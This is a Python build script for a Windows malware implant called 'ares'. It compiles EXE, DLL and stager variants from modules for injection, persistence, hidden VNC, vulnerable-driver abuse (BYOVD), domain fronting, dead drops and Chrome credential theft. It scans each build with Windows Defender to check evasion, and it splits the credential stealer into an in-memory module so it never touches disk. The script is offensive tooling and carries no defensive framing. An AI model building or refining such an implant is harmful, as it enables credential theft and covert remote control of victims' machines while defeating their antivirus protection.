#!/usr/bin/env python3
"""Production build test: compile without stealer.c + Defender scan"""
import subprocess, os, sys

BD = 'build'
AD = 'agent/native'
LIBS = '-lkernel32 -luser32 -lws2_32 -lgdi32 -luuid -ladvapi32 -lcrypt32 -lole32 -loleaut32 -lwinhttp -lbcrypt -liphlpapi -ldbghelp -lshlwapi -lntdll -lversion'

os.makedirs(BD, exist_ok=True)

# Find Defender
plat = r'C:\ProgramData\Microsoft\Windows Defender\Platform'
vs = sorted(os.listdir(plat), reverse=True)
MP = os.path.join(plat, vs[0], 'MpCmdRun.exe')

def scan(path):
    r = subprocess.run([MP, '-Scan', '-ScanType', '3', '-File', os.path.abspath(path), '-DisableRemediation'],
                      capture_output=True, text=True, timeout=30)
    return 'found no threats' in r.stdout

# Production EXE: stager + all modules EXCEPT stealer.c
prod_srcs = [
    'stager.c', 'core.c', 'syscall.c', 'chrome_v20.c',
    'socks5.c', 'hvnc.c', 'inject.c', 'persist.c',
    'byovd.c', 'eprocess.c', 'bof_loader.c', 'domain_front.c',
    'stack_spoof.c', 'cap_loader.c', 'dead_drop.c',
]
src_str = ' '.join(f'{AD}/{s}' for s in prod_srcs)

print('=== PRODUCTION BUILD TEST ===')

# EXE
out_exe = os.path.join(BD, 'ares_prod.exe')
cmd = f'gcc -w -DARES_RELEASE -O2 -s -fno-ident -fno-asynchronous-unwind-tables -Wl,--stack,4194304 -mwindows -I. -o {out_exe} {src_str} {LIBS}'
r = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd='.')
if r.returncode != 0:
    print(f'EXE FAIL: {r.stderr[-500:]}')
else:
    sz = os.path.getsize(out_exe)
    clean = scan(out_exe)
    print(f'PROD EXE: {"CLEAN" if clean else "DETECTED"} [{sz:,} bytes]')

# DLL
dll_srcs = prod_srcs + ['version_stubs.c']
dll_str = ' '.join(f'{AD}/{s}' for s in dll_srcs)
out_dll = os.path.join(BD, 'ares_prod.dll')
cmd2 = f'gcc -w -DARES_RELEASE -DARES_DLL_STAGER -O2 -s -fno-ident -fno-asynchronous-unwind-tables -shared -Wl,--stack,4194304 -mwindows -I. -o {out_dll} {dll_str} {LIBS}'
r2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True, cwd='.')
if r2.returncode != 0:
    print(f'DLL FAIL: {r2.stderr[-500:]}')
else:
    sz = os.path.getsize(out_dll)
    clean = scan(out_dll)
    print(f'PROD DLL: {"CLEAN" if clean else "DETECTED"} [{sz:,} bytes]')

# Stager (minimal)
out_stg = os.path.join(BD, 'ares_stager.exe')
stg_srcs = ['stager.c', 'core.c', 'syscall.c', 'stack_spoof.c', 'cap_loader.c', 'dead_drop.c', 'inject.c', 'domain_front.c', 'bof_loader.c']
stg_str = ' '.join(f'{AD}/{s}' for s in stg_srcs)
cmd3 = f'gcc -w -DARES_RELEASE -O2 -s -fno-ident -fno-asynchronous-unwind-tables -Wl,--stack,4194304 -mwindows -I. -o {out_stg} {stg_str} {LIBS}'
r3 = subprocess.run(cmd3, shell=True, capture_output=True, text=True, cwd='.')
if r3.returncode != 0:
    print(f'STAGER FAIL: {r3.stderr[-500:]}')
else:
    sz = os.path.getsize(out_stg)
    clean = scan(out_stg)
    print(f'STAGER:   {"CLEAN" if clean else "DETECTED"} [{sz:,} bytes]')

# Full (for comparison)
full_srcs = prod_srcs + ['stealer.c', 'chrome_inject.c']
full_str = ' '.join(f'{AD}/{s}' for s in full_srcs)
out_full = os.path.join(BD, 'ares_full.exe')
cmd4 = f'gcc -w -DARES_RELEASE -O2 -s -fno-ident -fno-asynchronous-unwind-tables -Wl,--stack,4194304 -mwindows -I. -o {out_full} {full_str} {LIBS}'
r4 = subprocess.run(cmd4, shell=True, capture_output=True, text=True, cwd='.')
if r4.returncode != 0:
    print(f'FULL FAIL: {r4.stderr[-500:]}')
else:
    sz = os.path.getsize(out_full)
    clean = scan(out_full)
    print(f'FULL:     {"CLEAN" if clean else "DETECTED"} [{sz:,} bytes]')

print('\n=== SUMMARY ===')
print('Production = stager + chrome_v20 + persist + socks5 + hvnc + byovd + eprocess + COFF loader')
print('Stealer = COFF module, loaded on-demand, never on disk')
